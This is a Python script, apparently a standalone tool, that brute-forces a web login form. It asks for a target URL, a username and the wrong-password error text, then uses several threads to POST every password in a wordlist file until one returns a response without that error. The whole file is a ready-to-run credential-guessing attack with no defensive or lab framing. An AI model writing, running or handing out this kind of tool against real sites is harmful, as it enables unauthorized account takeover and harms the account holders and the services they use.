import requests
import threading

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message

    def check_password(self, password):
        data = {
            'username': self.username,
            'password': password
        }
        response = requests.post(self.url, data=data)
        if self.error_message in response.text:
            return False
        return True

def crack_passwords(passwords, cracker):
    for password in passwords:
        password = password.strip()
        print(f"Trying Password: {password}")
        if cracker.check_password(password):
            print(f"Success! Username: {cracker.username}, Password: {password}")
            return True
    return False

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error_message = input("Enter Wrong Password Error Message: ")

    cracker = BruteForceCracker(url, username, error_message)

    try:
        with open("passwords.txt", "r") as file:
            passwords = file.readlines()

        chunk_size = 1000
        threads = []

        for i in range(0, len(passwords), chunk_size):
            chunk = passwords[i:i+chunk_size]
            thread = threading.Thread(target=crack_passwords, args=(chunk, cracker))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print("Bruteforce attack complete.")
    except FileNotFoundError:
        print("Error: 'passwords.txt' not found. Please make sure the file is in the same directory as the script.")

if __name__ == "__main__":
    main()
